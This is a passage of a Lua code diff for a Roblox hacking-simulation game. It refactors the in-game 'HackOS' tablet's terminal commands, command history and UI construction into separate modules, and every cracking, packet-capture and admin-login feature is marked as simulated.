+simOps.fakeCrackNG(rest(2))
 elseif cmd == "admin" then
 local on = (args[2] or ""):lower() == "on"
-Player:SetAttribute("Obj_Admin", on)
-if on then
-browserState.adminLoggedIn = true
-end
+browserState.adminLoggedIn = on
 addLine("Admin mode (sim) = " .. tostring(on))
 elseif cmd == "save" then
-saveNow()
-elseif cmd == "load" then
-loadNow()
+if saveNow({ force = true }) then
+addLine("Save completed.")
+end
+elseif cmd == "load" or cmd == "continue" then
+addLine("Use Continue on the start screen.")
 elseif cmd == "time" then
 addLine(os.date("%Y-%m-%d %H:%M:%S"))
 elseif cmd == "clear" or cmd == "reset" then
-TermOut:ClearAllChildren()
-mk("UIListLayout", { Parent = TermOut, Name = "UIListLayout", Padding = UDim.new(0, 4), SortOrder = Enum.SortOrder.LayoutOrder })
-addLine(PROMPT)
+resetTerminalOutput(PROMPT)
 return
 else
 addLine("I do not know that command. Type: help")
 end
-if cmd ~= "hint" then
+if cmd ~= "hint" and cmd ~= "jamcam" and cmd ~= "jamcamera" then
 syncScenarioProgress(raw)
 end
 addLine(PROMPT)
@@ -1421,7 +2359,7 @@ end
 historyIndex = nil
 currentDraft = ""
 end
-local function historyUp()
+historyUp = function()
 if #commandHistory == 0 or not TermInput then return end
 if historyIndex == nil then
 currentDraft = TermInput.Text
@@ -1432,7 +2370,7 @@ end
 TermInput.Text = commandHistory[historyIndex] or ""
 TermInput.CursorPosition = #TermInput.Text + 1
 end
-local function historyDown()
+historyDown = function()
 if #commandHistory == 0 or not TermInput then return end
 if historyIndex == nil then
 return
@@ -1446,702 +2384,111 @@ TermInput.Text = commandHistory[historyIndex] or ""
 end
 TermInput.CursorPosition = #TermInput.Text + 1
 end
-local function buildQuickLink(parent, text, url, posX)
-local b = mk("TextButton", {
-Parent = parent,
-Text = text,
-Font = Enum.Font.GothamSemibold,
-TextSize = 12,
-TextColor3 = Color3.new(1, 1, 1),
-BackgroundColor3 = Color3.fromRGB(70, 96, 160),
-Size = UDim2.fromOffset(110, 24),
-Position = UDim2.new(0, posX, 0, 0),
-})
-round(b, 8)
-b.MouseButton1Click:Connect(function()
-navigateTo(url)
-end)
-return b
-end
 local function buildMainUI()
-local gui = mk("ScreenGui", {
-Parent = PlayerGui,
-Name = "TabletGUI",
-IgnoreGuiInset = true,
-ResetOnSpawn = false,
-Enabled = false,
-})
-local desktop = mk("Frame", {
-Parent = gui,
-Size = UDim2.fromScale(1, 1),
-BackgroundColor3 = Color3.fromRGB(10, 14, 22),
-})
-mk("UIGradient", {
-Parent = desktop,
-Color = ColorSequence.new({
-ColorSequenceKeypoint.new(0, Color3.fromRGB(23, 34, 58)),
-ColorSequenceKeypoint.new(1, Color3.fromRGB(7, 10, 16)),
-}),
-Rotation = 120,
-})
-local top = mk("Frame", {
-Parent = desktop,
-Size = UDim2.new(1, 0, 0, 50),
-BackgroundColor3 = Color3.fromRGB(17, 22, 32),
-BackgroundTransparency = 0.08,
-})
-mk("TextLabel", {
-Parent = top,
-BackgroundTransparency = 1,
-Text = "HackOS v1.4",
-Font = Enum.Font.GothamBold,
-TextSize = 16,
-TextColor3 = Color3.fromRGB(220, 236, 255),
-Position = UDim2.new(0, 14, 0, 0),
-Size = UDim2.fromOffset(180, 50),
-TextXAlignment = Enum.TextXAlignment.Left,
-})
-ClockLabel = mk("TextLabel", {
-Parent = top,
-BackgroundTransparency = 1,
-Text = "--:--:--",
-Font = Enum.Font.Code,
-TextSize = 15,
-TextColor3 = Color3.fromRGB(190, 208, 240),
-Position = UDim2.new(1, -170, 0, 0),
-Size = UDim2.fromOffset(160, 50),
-TextXAlignment = Enum.TextXAlignment.Right,
-})
-local function button(text, x, w)
-local b = mk("TextButton", {
-Parent = top,
-Text = text,
-Font = Enum.Font.GothamSemibold,
-TextSize = 14,
-TextColor3 = Color3.new(1, 1, 1),
-BackgroundColor3 = Color3.fromRGB(45, 57, 84),
-Size = UDim2.fromOffset(w or 92, 30),
-Position = UDim2.new(0, x, 0, 10),
-})
-round(b, 9)
-return b
-end
-local bTerm = button("Terminal", 180, 80)
-local bBrowser = button("Browser", 265, 80)
-local bMissions = button("Missions", 350, 80)
-local bSave = button("Save", 435, 72)
-local bLoad = button("Load", 512, 72)
-local pad = mk("Frame", {
-Parent = desktop,
-Position = UDim2.new(0, 14, 0, 64),
-Size = UDim2.new(1, -28, 1, -78),
-BackgroundColor3 = Color3.fromRGB(15, 19, 28),
-BackgroundTransparency = 0.1,
-})
-round(pad, 14)
-TermFrame = mk("Frame", {
-Parent = pad,
-BackgroundColor3 = Color3.fromRGB(11, 14, 18),
-Size = UDim2.new(0.52, -6, 1, -12),
-Position = UDim2.new(0, 6, 0, 6),
-})
-BrowserFrame = mk("Frame", {
-Parent = pad,
-BackgroundColor3 = Color3.fromRGB(236, 238, 243),
-Size = UDim2.new(0.48, -6, 1, -12),
-Position = UDim2.new(0.52, 0, 0, 6),
-Visible = false,
-})
-round(TermFrame, 12)
-round(BrowserFrame, 12)
-MissionsFrame = mk("Frame", {
-Parent = pad,
-BackgroundColor3 = Color3.fromRGB(15, 19, 28),
-Size = UDim2.new(1, -12, 1, -12),
-Position = UDim2.new(0, 6, 0, 6),
-Visible = false,
-})
-round(MissionsFrame, 12)
-mk("TextLabel", {
-Parent = MissionsFrame,
-BackgroundTransparency = 1,
-Text = " MISSIONS",
-Font = Enum.Font.GothamBlack,
-TextSize = 18,
-TextColor3 = Color3.fromRGB(220, 236, 255),
-Position = UDim2.new(0, 10, 0, 10),
-Size = UDim2.new(1, -20, 0, 30),
-TextXAlignment = Enum.TextXAlignment.Left,
-})
-MissionsList = mk("ScrollingFrame", {
-Parent = MissionsFrame,
-BackgroundColor3 = Color3.fromRGB(8, 10, 13),
-BorderSizePixel = 0,
-ScrollBarThickness = 6,
-Size = UDim2.new(1, -20, 0, 200),
-Position = UDim2.new(0, 10, 0, 40),
-})
-round(MissionsList, 10)
-mk("UIListLayout", {
-Parent = MissionsList,
-Name = "UIListLayout",
-Padding = UDim.new(0, 6),
-SortOrder = Enum.SortOrder.LayoutOrder,
-})
-
-mk("TextLabel", {
-Parent = MissionsFrame,
-BackgroundTransparency = 1,
-Text = " OBJECTIVES",
-Font = Enum.Font.GothamBlack,
-TextSize = 18,
-TextColor3 = Color3.fromRGB(220, 236, 255),
-Position = UDim2.new(0, 10, 0, 250),
-Size = UDim2.new(1, -20, 0, 30),
-TextXAlignment = Enum.TextXAlignment.Left,
-})
-ObjectivesList = mk("ScrollingFrame", {
-Parent = MissionsFrame,
-BackgroundColor3 = Color3.fromRGB(8, 10, 13),
-BorderSizePixel = 0,
-ScrollBarThickness = 6,
-Size = UDim2.new(1, -20, 1, -290),
-Position = UDim2.new(0, 10, 0, 290),
-})
-round(ObjectivesList, 10)
-mk("UIListLayout", {
-Parent = ObjectivesList,
-Name = "UIListLayout",
-Padding = UDim.new(0, 6),
-SortOrder = Enum.SortOrder.LayoutOrder,
-})
-TermOut = mk("ScrollingFrame", {
-Parent = TermFrame,
-BackgroundColor3 = Color3.fromRGB(8, 10, 13),
-BorderSizePixel = 0,
-ScrollBarThickness = 6,
-Size = UDim2.new(1, -16, 1, -78),
-Position = UDim2.new(0, 8, 0, 8),
-})
-round(TermOut, 10)
-mk("UIListLayout", {
-Parent = TermOut,
-Name = "UIListLayout",
-Padding = UDim.new(0, 4),
-SortOrder = Enum.SortOrder.LayoutOrder,
-})
-local h = UIS.TouchEnabled and 40 or 32
-TermInput = mk("TextBox", {
-Parent = TermFrame,
-Text = "",
-ClearTextOnFocus = false,
-PlaceholderText = "Type command... (Up/Down for history)",
-Font = Enum.Font.Code,
-TextSize = 16,
-TextColor3 = Color3.fromRGB(172, 255, 198),
-BackgroundColor3 = Color3.fromRGB(8, 10, 13),
-BorderSizePixel = 0,
-Size = UDim2.new(1, -(UIS.TouchEnabled and 112 or 16), 0, h),
-Position = UDim2.new(0, 8, 1, -(8 + h)),
-})
-round(TermInput, 9)
-if UIS.TouchEnabled then
-local run = mk("TextButton", {
-Parent = TermFrame,
-Text = "Run",
-Font = Enum.Font.GothamSemibold,
-TextSize = 16,
-TextColor3 = Color3.new(1, 1, 1),
-BackgroundColor3 = Color3.fromRGB(72, 126, 255),
-Size = UDim2.fromOffset(90, h),
-Position = UDim2.new(1, -98, 1, -(8 + h)),
-})
-round(run, 9)
-run.MouseButton1Click:Connect(function()
-local c = TermInput.Text
-TermInput.Text = ""
-pushHistory(c)
-handle(c)
-task.defer(function()
-if TermInput and TermInput.Parent and TermFrame.Visible then
-TermInput:CaptureFocus()
-end
-end)
-end)
-end
-UrlBox = mk("TextBox", {
-Parent = BrowserFrame,
-Text = "",
-PlaceholderText = "home (or type a URL)",
-Font = Enum.Font.Gotham,
-TextSize = 15,
-TextColor3 = Color3.new(0, 0, 0),
-BackgroundColor3 = Color3.fromRGB(223, 227, 236),
-Size = UDim2.new(1, -88, 0, 32),
-Position = UDim2.new(0, 8, 0, 8),
-})
-round(UrlBox, 8)
-local goBtn = mk("TextButton", {
-Parent = BrowserFrame,
-Text = "GO",
-Font = Enum.Font.GothamSemibold,
-TextSize = 14,
-TextColor3 = Color3.new(1, 1, 1),
-BackgroundColor3 = Color3.fromRGB(79, 131, 255),
-Size = UDim2.fromOffset(64, 32),
-Position = UDim2.new(1, -72, 0, 8),
-})
-round(goBtn, 8)
-BrowserStatusLabel = mk("TextLabel", {
-Parent = BrowserFrame,
-BackgroundTransparency = 1,
-Text = "",
-Font = Enum.Font.Gotham,
-TextSize = 12,
-TextColor3 = Color3.fromRGB(70, 82, 100),
-TextXAlignment = Enum.TextXAlignment.Left,
-Position = UDim2.new(0, 8, 0, 42),
-Size = UDim2.new(1, -16, 0, 18),
-})
-LinkBar = mk("Frame", {
-Parent = BrowserFrame,
-BackgroundTransparency = 1,
-Position = UDim2.new(0, 8, 0, 62),
-Size = UDim2.new(1, -16, 0, 24),
-})
-buildQuickLink(LinkBar, "HackOS Home", "hackos://home", 0)
-buildQuickLink(LinkBar, "PacketNet", "rbxpacketnet.com", 118)
-buildQuickLink(LinkBar, "Admin Portal", "bloxplay.com/admin", 236)
-BrowserContent = mk("Frame", {
-Parent = BrowserFrame,
-BackgroundColor3 = Color3.fromRGB(250, 251, 253),
-BorderSizePixel = 0,
-Position = UDim2.new(0, 8, 0, 92),
-Size = UDim2.new(1, -16, 1, -100),
-})
-round(BrowserContent, 10)
-PageLabel = mk("TextLabel", {
-Parent = BrowserContent,
-BackgroundTransparency = 1,
-TextWrapped = true,
-TextXAlignment = Enum.TextXAlignment.Left,
-TextYAlignment = Enum.TextYAlignment.Top,
-Font = Enum.Font.Gotham,
-TextSize = 16,
-TextColor3 = Color3.new(0, 0, 0),
-Text = "",
-Size = UDim2.new(1, -16, 1, -16),
-Position = UDim2.new(0, 8, 0, 8),
-Visible = true,
-})
-AdminLoginPage = mk("Frame", {
-Parent = BrowserContent,
-BackgroundTransparency = 1,
-Size = UDim2.fromScale(1, 1),
-Visible = false,
-})
-mk("TextLabel", {
-Parent = AdminLoginPage,
-BackgroundTransparency = 1,
-Text = "BLOXPLAY ADMIN",
-Font = Enum.Font.GothamBlack,
-TextSize = 24,
-TextColor3 = Color3.fromRGB(28, 36, 52),
-Size = UDim2.new(1, 0, 0, 30),
-Position = UDim2.new(0, 0, 0, 18),
-})
-mk("TextLabel", {
-Parent = AdminLoginPage,
-BackgroundTransparency = 1,
-Text = "Authorized Personnel Login (SIM)",
-Font = Enum.Font.Gotham,
-TextSize = 14,
-TextColor3 = Color3.fromRGB(90, 100, 118),
-Size = UDim2.new(1, 0, 0, 20),
-Position = UDim2.new(0, 0, 0, 50),
-})
-AdminUserBox = mk("TextBox", {
-Parent = AdminLoginPage,
-Text = "",
-PlaceholderText = "username",
-Font = Enum.Font.Gotham,
-TextSize = 16,
-TextColor3 = Color3.new(0, 0, 0),
-BackgroundColor3 = Color3.fromRGB(233, 237, 244),
-BorderSizePixel = 0,
-Size = UDim2.new(0, 260, 0, 36),
-Position = UDim2.new(0.5, -130, 0, 95),
-})
-round(AdminUserBox, 8)
-AdminPassBox = mk("TextBox", {
-Parent = AdminLoginPage,
-Text = "",
-PlaceholderText = "password",
-Font = Enum.Font.Gotham,
-TextSize = 16,
-TextColor3 = Color3.new(0, 0, 0),
-BackgroundColor3 = Color3.fromRGB(233, 237, 244),
-BorderSizePixel = 0,
-Size = UDim2.new(0, 260, 0, 36),
-Position = UDim2.new(0.5, -130, 0, 139),
-ClearTextOnFocus = false,
-MultiLine = false,
-TextEditable = true,
-})
-round(AdminPassBox, 8)
-AdminPassBox:SetAttribute("RealPassword", "")
-local adminPassMasking = false
-AdminPassBox:GetPropertyChangedSignal("Text"):Connect(function()
-if adminPassMasking then return end
-local real = tostring(AdminPassBox:GetAttribute("RealPassword") or "")
-local shown = tostring(AdminPassBox.Text or "")
-if shown == real then
-real = shown
-elseif shown ~= string.rep("*", #real) then
-if #shown > #real then
-local added = shown:sub(#real + 1)
-real = real .. added
-elseif #shown < #real then
-real = real:sub(1, #shown)
-end
-end
-AdminPassBox:SetAttribute("RealPassword", real)
-adminPassMasking = true
-local masked = string.rep("*", #real)
-if AdminPassBox.Text ~= masked then
-AdminPassBox.Text = masked
-end
-AdminPassBox.CursorPosition = #masked + 1
-adminPassMasking = false
-end)
-local adminLoginBtn = mk("TextButton", {
-Parent = AdminLoginPage,
-Text = "LOGIN",
-Font = Enum.Font.GothamBold,
-TextSize = 15,
-TextColor3 = Color3.new(1, 1, 1),
-BackgroundColor3 = Color3.fromRGB(76, 123, 255),
-Size = UDim2.new(0, 140, 0, 36),
-Position = UDim2.new(0.5, -70, 0, 188),
-})
-round(adminLoginBtn, 8)
-AdminLoginStatus = mk("TextLabel", {
-Parent = AdminLoginPage,
-BackgroundTransparency = 1,
-Text = "",
-Font = Enum.Font.Gotham,
-TextSize = 13,
-TextColor3 = Color3.fromRGB(90, 100, 118),
-Size = UDim2.new(1, -30, 0, 20),
-Position = UDim2.new(0, 15, 0, 233),
-})
-AdminDashboardPage = mk("Frame", {
-Parent = BrowserContent,
-BackgroundTransparency = 1,
-Size = UDim2.fromScale(1, 1),
-Visible = false,
-})
-mk("TextLabel", {
-Parent = AdminDashboardPage,
-BackgroundTransparency = 1,
-Text = "BLOXPLAY ADMIN DATABASE",
-Font = Enum.Font.GothamBlack,
-TextSize = 22,
-TextColor3 = Color3.fromRGB(28, 36, 52),
-Position = UDim2.new(0, 10, 0, 10),
-Size = UDim2.new(1, -20, 0, 28),
-TextXAlignment = Enum.TextXAlignment.Left,
-})
-AdminSearchBox = mk("TextBox", {
-Parent = AdminDashboardPage,
-Text = "",
-PlaceholderText = "Search staff or player data...",
-Font = Enum.Font.Gotham,
-TextSize = 14,
-TextColor3 = Color3.new(0, 0, 0),
-BackgroundColor3 = Color3.fromRGB(233, 237, 244),
-BorderSizePixel = 0,
-Position = UDim2.new(0, 10, 0, 46),
-Size = UDim2.new(1, -20, 0, 34),
-})
-round(AdminSearchBox, 8)
-AdminResultsFrame = mk("ScrollingFrame", {
-Parent = AdminDashboardPage,
-BackgroundColor3 = Color3.fromRGB(238, 242, 248),
-BorderSizePixel = 0,
-ScrollBarThickness = 6,
-Position = UDim2.new(0, 10, 0, 88),
-Size = UDim2.new(1, -20, 1, -98),
-})
-round(AdminResultsFrame, 8)
-mk("UIListLayout", {
-Parent = AdminResultsFrame,
-Name = "UIListLayout",
-Padding = UDim.new(0, 6),
-SortOrder = Enum.SortOrder.LayoutOrder,
-})
-PacketPage = mk("Frame", {
-Parent = BrowserContent,
-BackgroundTransparency = 1,
-Size = UDim2.fromScale(1, 1),
-Visible = false,
-})
-mk("TextLabel", {
-Parent = PacketPage,
-BackgroundTransparency = 1,
-Text = "RBXPacketNet",
-Font = Enum.Font.GothamBlack,
-TextSize = 24,
-TextColor3 = Color3.fromRGB(30, 40, 58),
-Position = UDim2.new(0, 10, 0, 10),
-Size = UDim2.new(1, -20, 0, 28),
-TextXAlignment = Enum.TextXAlignment.Left,
-})
-mk("TextLabel", {
-Parent = PacketPage,
-BackgroundTransparency = 1,
-Text = "Targeted Packet Capture (SIM)",
-Font = Enum.Font.Gotham,
-TextSize = 13,
-TextColor3 = Color3.fromRGB(88, 98, 114),
-Position = UDim2.new(0, 10, 0, 36),
-Size = UDim2.new(1, -20, 0, 18),
-TextXAlignment = Enum.TextXAlignment.Left,
-})
-PacketToolbar = mk("Frame", {
-Parent = PacketPage,
-BackgroundColor3 = Color3.fromRGB(233, 237, 244),
-BorderSizePixel = 0,
-Position = UDim2.new(0, 10, 0, 62),
-Size = UDim2.new(1, -20, 0, 42),
-})
-round(PacketToolbar, 8)
-PacketIPBox = mk("TextBox", {
-Parent = PacketToolbar,
-Text = "",
-PlaceholderText = "Target IP (e.g. 192.168.32.12)",
-Font = Enum.Font.Gotham,
-TextSize = 13,
-TextColor3 = Color3.new(0, 0, 0),
-BackgroundColor3 = Color3.fromRGB(248, 250, 253),
-BorderSizePixel = 0,
-Position = UDim2.new(0, 8, 0, 6),
-Size = UDim2.new(0, 160, 0, 30),
-})
-round(PacketIPBox, 8)
-PacketDNSBox = mk("TextBox", {
-Parent = PacketToolbar,
-Text = "",
-PlaceholderText = "DNS/Server filter",
-Font = Enum.Font.Gotham,
-TextSize = 13,
-TextColor3 = Color3.new(0, 0, 0),
-BackgroundColor3 = Color3.fromRGB(248, 250, 253),
-BorderSizePixel = 0,
-Position = UDim2.new(0, 176, 0, 6),
-Size = UDim2.new(0, 132, 0, 30),
-})
-round(PacketDNSBox, 8)
-PacketApplyBtn = mk("TextButton", {
-Parent = PacketToolbar,
-Text = "Capture",
-Font = Enum.Font.GothamSemibold,
-TextSize = 13,
-TextColor3 = Color3.new(1, 1, 1),
-BackgroundColor3 = Color3.fromRGB(79, 131, 255),
-Position = UDim2.new(1, -180, 0, 6),
-Size = UDim2.new(0, 60, 0, 30),
-})
-round(PacketApplyBtn, 8)
-PacketClearBtn = mk("TextButton", {
-Parent = PacketToolbar,
-Text = "Clear",
-Font = Enum.Font.GothamSemibold,
-TextSize = 13,
-TextColor3 = Color3.new(1, 1, 1),
-BackgroundColor3 = Color3.fromRGB(110, 120, 145),
-Position = UDim2.new(1, -114, 0, 6),
-Size = UDim2.new(0, 52, 0, 30),
-})
-round(PacketClearBtn, 8)
-PacketFollowBtn = mk("TextButton", {
-Parent = PacketToolbar,
-Text = "Follow",
-Font = Enum.Font.GothamSemibold,
-TextSize = 13,
-TextColor3 = Color3.new(1, 1, 1),
-BackgroundColor3 = Color3.fromRGB(76, 168, 110),
-Position = UDim2.new(1, -56, 0, 6),
-Size = UDim2.new(0, 48, 0, 30),
-})
-round(PacketFollowBtn, 8)
-PacketListFrame = mk("ScrollingFrame", {
-Parent = PacketPage,
-BackgroundColor3 = Color3.fromRGB(233, 237, 244),
-BorderSizePixel = 0,
-ScrollBarThickness = 6,
-Position = UDim2.new(0, 10, 0, 112),
-Size = UDim2.new(1, -20, 1, -122),
-})
-round(PacketListFrame, 8)
-mk("UIListLayout", {
-Parent = PacketListFrame,
-Name = "UIListLayout",
-Padding = UDim.new(0, 6),
-SortOrder = Enum.SortOrder.LayoutOrder,
-})
-goBtn.MouseButton1Click:Connect(function()
-navigateTo(UrlBox.Text)
-end)
-local function tryAdminLogin()
-local u = tostring((AdminUserBox.Text or ""):lower())
-local p = tostring(AdminPassBox:GetAttribute("RealPassword") or "")
-if u == "bloxplay-admin" and p == "blox123" then
-browserState.adminLoggedIn = true
-Player:SetAttribute("Obj_Admin", true)
-AdminLoginStatus.Text = "Login successful (sim)"
-AdminPassBox.Text = ""
-AdminPassBox:SetAttribute("RealPassword", "")
-navigateTo("bloxplay.com/admin")
-else
-AdminLoginStatus.Text = "Access denied (sim)"
-AdminPassBox.Text = ""
-AdminPassBox:SetAttribute("RealPassword", "")
-end
-end
-adminLoginBtn.MouseButton1Click:Connect(tryAdminLogin)
-AdminSearchBox:GetPropertyChangedSignal("Text"):Connect(function()
-renderAdminResults(AdminSearchBox.Text)
-end)
-PacketApplyBtn.MouseButton1Click:Connect(function()
-local ip = PacketIPBox.Text
-if startPacketCaptureForIP(ip) then
-populatePacketRows()
-local host = getHostByIP(ip)
-setBrowserStatus(("Capturing packets for %s [%s] (sim)"):format(host.label, host.ip))
-else
-populatePacketRows()
-setBrowserStatus("Unknown IP. No simulated capture available.")
-end
-end)
-PacketClearBtn.MouseButton1Click:Connect(function()
-if PacketIPBox then PacketIPBox.Text = "" end
-if PacketDNSBox then PacketDNSBox.Text = "" end
-ActivePacketCapture.targetIP = ""
-ActivePacketCapture.targetLabel = ""
-ActivePacketCapture.rows = {}
-populatePacketRows()
-setBrowserStatus("RBXPacketNet filters cleared (sim)")
-end)
-PacketFollowBtn.MouseButton1Click:Connect(function()
-if PacketIPBox.Text == "" then
-PacketIPBox.Text = "192.168.32.12"
-end
-startPacketCaptureForIP(PacketIPBox.Text)
-if PacketDNSBox.Text == "" then
-PacketDNSBox.Text = "playerdata"
-end
-populatePacketRows()
-setBrowserStatus("Following simulated traffic stream.")
-end)
-UIS.InputBegan:Connect(function(input, gameProcessed)
-if gameProcessed then return end
-if input.UserInputType ~= Enum.UserInputType.Keyboard then return end
-if input.KeyCode == Enum.KeyCode.Up then
-local focused = nil
-pcall(function() focused = UIS:GetFocusedTextBox() end)
-if focused == TermInput then
-historyUp()
-end
-return
-elseif input.KeyCode == Enum.KeyCode.Down then
-local focused = nil
-pcall(function() focused = UIS:GetFocusedTextBox() end)
-if focused == TermInput then
-historyDown()
-end
-return
-end
-if input.KeyCode ~= Enum.KeyCode.Return and input.KeyCode ~= Enum.KeyCode.KeypadEnter then
-return
-end
-local focused = nil
-pcall(function() focused = UIS:GetFocusedTextBox() end)
-if focused == UrlBox then
-navigateTo(UrlBox.Text)
-elseif focused == AdminPassBox or focused == AdminUserBox then
-if AdminLoginPage and AdminLoginPage.Visible then
-tryAdminLogin()
-end
-elseif focused == PacketIPBox or focused == PacketDNSBox then
-if PacketPage and PacketPage.Visible then
-if PacketIPBox.Text ~= "" then
-startPacketCaptureForIP(PacketIPBox.Text)
-end
-populatePacketRows()
-end
-end
-end)
-UrlBox.FocusLost:Connect(function(enterPressed)
-if enterPressed then
-navigateTo(UrlBox.Text)
-end
-end)
-local function canRefocusTerminal()
-if not (MainGUI and MainGUI.Enabled) then return false end
-if not (TermFrame and TermFrame.Visible) then return false end
-if not (TermInput and TermInput.Parent) then return false end
-if not (isToolEquipped() and started) then return false end
-local focused = nil
-pcall(function() focused = UIS:GetFocusedTextBox() end)
-return focused == nil or focused == TermInput
-end
-TermInput:GetPropertyChangedSignal("Text"):Connect(function()
+local ui = TabletMainUI.build({
+PlayerGui = PlayerGui,
+UIS = UIS,
+mk = mk,
+round = round,
+PROMPT = PROMPT,
+addLine = addLine,
+navigateTo = navigateTo,
+pushHistory = pushHistory,
+handle = handle,
+setVisiblePanel = setVisiblePanel,
+requestCameraJamFromTablet = requestCameraJamFromTablet,
+requestGuardDistractFromTablet = requestGuardDistractFromTablet,
+saveNow = saveNow,
+startPacketCaptureForIP = startPacketCaptureForIP,
+populatePacketRows = populatePacketRows,
+renderAdminResults = renderAdminResults,
+renderIPBlockerHistory = renderIPBlockerHistory,
+showAdminDashboard = showAdminDashboard,
+setBrowserStatus = setBrowserStatus,
+submitScenarioAction = submitScenarioAction,
+isToolEquipped = isToolEquipped,
+getBrowserState = function()
+return browserState
+end,
+isStarted = function()
+return started == true
+end,
+getHostByIP = getHostByIP,
+ActivePacketCapture = ActivePacketCapture,
+WANNAWAIL_ATTR_SOURCE_BLOCKED = WANNAWAIL_ATTR_SOURCE_BLOCKED,
+WANNAWAIL_ATTACKER_IP = WANNAWAIL_ATTACKER_IP,
+historyUp = historyUp,
+historyDown = historyDown,
+onTerminalTextChanged = function(text)
 if historyIndex == nil then
-currentDraft = TermInput.Text
+currentDraft = text
 end
-end)
-TermInput.FocusLost:Connect(function(enter)
-if enter then
-local c = TermInput.Text
-TermInput.Text = ""
-pushHistory(c)
-handle(c)
+end,
+})
+MainGUI = ui.MainGUI
+TermFrame = ui.TermFrame
+BrowserFrame = ui.BrowserFrame
+TermOut = ui.TermOut
+TermInput = ui.TermInput
+UrlBox = ui.UrlBox
+PageLabel = ui.PageLabel
+ClockLabel = ui.ClockLabel
+MissionsFrame = ui.MissionsFrame
+MissionsList = ui.MissionsList
+ObjectivesList = ui.ObjectivesList
+BrowserStatusLabel = ui.BrowserStatusLabel
+BrowserContent = ui.BrowserContent
+LinkBar = ui.LinkBar
+AdminLoginPage = ui.AdminLoginPage
+AdminDashboardPage = ui.AdminDashboardPage
+AdminUserBox = ui.AdminUserBox
+AdminPassBox = ui.AdminPassBox
+AdminLoginStatus = ui.AdminLoginStatus
+AdminSearchBox = ui.AdminSearchBox
+AdminResultsFrame = ui.AdminResultsFrame
+PacketPage = ui.PacketPage
+PacketToolbar = ui.PacketToolbar
+PacketListFrame = ui.PacketListFrame
+PacketIPBox = ui.PacketIPBox
+PacketDNSBox = ui.PacketDNSBox
+PacketApplyBtn = ui.PacketApplyBtn
+PacketClearBtn = ui.PacketClearBtn
+PacketFollowBtn = ui.PacketFollowBtn
+if TermOut then
+resetTerminalOutput(PROMPT)
 end
-task.defer(function()
-if canRefocusTerminal() then
-TermInput:CaptureFocus()
+return MainGUI
 end
-end)
-end)
-bTerm.MouseButton1Click:Connect(function()
-TermFrame.Visible = true
-BrowserFrame.Visible = false
-MissionsFrame.Visible = false
-TermInput:CaptureFocus()
-end)
-bBrowser.MouseButton1Click:Connect(function()
-TermFrame.Visible = false
-BrowserFrame.Visible = true
-MissionsFrame.Visible = false
-if UrlBox and UrlBox.Text == "" then
-UrlBox.Text = "home"
-navigateTo("home")
-else
-navigateTo(UrlBox.Text)
+
+installSimOps = function()
+TabletSimOps.install({
+browserState = browserState,
+terminalState = terminalState,
+ActivePacketCapture = ActivePacketCapture,
+OpenFiles = OpenFiles,
+Player = Player,
+addLine = addLine,
+getRemote = getRemote,
+CAMERA_JAM_REMOTE_NAME = CAMERA_JAM_REMOTE_NAME,
+WANNAWAIL_ATTR_SOURCE_BLOCKED = WANNAWAIL_ATTR_SOURCE_BLOCKED,
+WANNAWAIL_ATTR_FIREWALL_BLOCKED = WANNAWAIL_ATTR_FIREWALL_BLOCKED,
+WANNAWAIL_ATTR_PROCESS_KILLED = WANNAWAIL_ATTR_PROCESS_KILLED,
+WANNAWAIL_ATTR_LOADER_REMOVED = WANNAWAIL_ATTR_LOADER_REMOVED,
+WANNAWAIL_ATTR_CONTAINED = WANNAWAIL_ATTR_CONTAINED,
+WANNAWAIL_ATTACKER_IP = WANNAWAIL_ATTACKER_IP,
+SimFSByHost = SimFSByHost,
+SimFileContentsByHost = SimFileContentsByHost,
+SimMetadataByHost = SimMetadataByHost,
+SimProcessesByHost = SimProcessesByHost,
+getAllHostsList = getAllHostsList,
+getHostByIP = getHostByIP,
+startPacketCaptureForIP = startPacketCaptureForIP,
+setBrowserStatus = setBrowserStatus,
+})
 end
-pcall(function() UrlBox:CaptureFocus() end)
-end)
-bMissions.MouseButton1Click:Connect(function()
-TermFrame.Visible = false
-BrowserFrame.Visible = false
-MissionsFrame.Visible = true
-end)
-bSave.MouseButton1Click:Connect(saveNow)
-bLoad.MouseButton1Click:Connect(loadNow)
-addLine(PROMPT)
-return gui
-end
+
+installSimOps()
+
 -- Boot splash with a real loading bar
 local function playStart(onDone)
 teardownStart()
@@ -2388,6 +2735,7 @@ Position = UDim2.new(0.5, -105, 1, -58),
 })
 round(startBtn, 12)
 startBtn.MouseButton1Click:Connect(function()
+	browserState._markInteraction()
 if not isToolEquipped() then
 gui.Enabled = false
 return
@@ -2399,7 +2747,10 @@ resetUI()
 MainGUI.Enabled = true
 started = true
 playAudio()
-if TermInput then TermInput:CaptureFocus() end
+if browserState._ensureChapter3MailVisible then
+browserState._ensureChapter3MailVisible()
+end
+if TermInput and not (BrowserFrame and BrowserFrame.Visible) then TermInput:CaptureFocus() end
 else
 stopAudio()
 end
@@ -2420,350 +2771,43 @@ return allowE() and Enum.ContextActionResult.Sink or Enum.ContextActionResult.Pa
 end, false, Enum.ContextActionPriority.High.Value, Enum.KeyCode.E)
 end
 local function renderMissionCards(objectivesList)
-	if not MissionsList then return end
-	objectivesList = type(objectivesList) == "table" and objectivesList or {}
-
-	-- Clear previous mission cards
-	for _, child in ipairs(MissionsList:GetChildren()) do
-		if child:IsA("Frame") then
-			child:Destroy()
-		end
-	end
-
-	for _, taskInfo in ipairs(objectivesList) do
-		local taskRow = mk("Frame", {
-			Parent = MissionsList,
-			BackgroundColor3 = Color3.fromRGB(20, 26, 38),
-			Size = UDim2.new(1, -10, 0, 50),
-		})
-		round(taskRow, 8)
-
-		local textColor = Color3.new(1, 1, 1)
-		if taskInfo.status == "Completed" then
-			textColor = Color3.fromRGB(160, 160, 160)
-		end
-		local label = mk("TextLabel", {
-			Parent = taskRow,
-			BackgroundTransparency = 1,
-			Text = taskInfo.text,
-			Font = Enum.Font.GothamSemibold,
-			TextSize = 14,
-			TextColor3 = textColor,
-			Position = UDim2.new(0, 10, 0, 5),
-			Size = UDim2.new(1, -20, 0, 20),
-			TextXAlignment = Enum.TextXAlignment.Left,
-		})
-		if taskInfo.status == "Completed" then
-			mk("Frame", {
-				Parent = label,
-				BackgroundColor3 = Color3.fromRGB(160, 160, 160),
-				BorderSizePixel = 0,
-				Size = UDim2.new(1, 0, 0, 2),
-				Position = UDim2.new(0, 0, 0.5, -1),
-			})
-		end
-
-		local statusColor = Color3.fromRGB(150, 150, 150)
-		if taskInfo.status == "Completed" then
-			statusColor = Color3.fromRGB(0, 255, 100)
-		elseif taskInfo.status == "In Progress" then
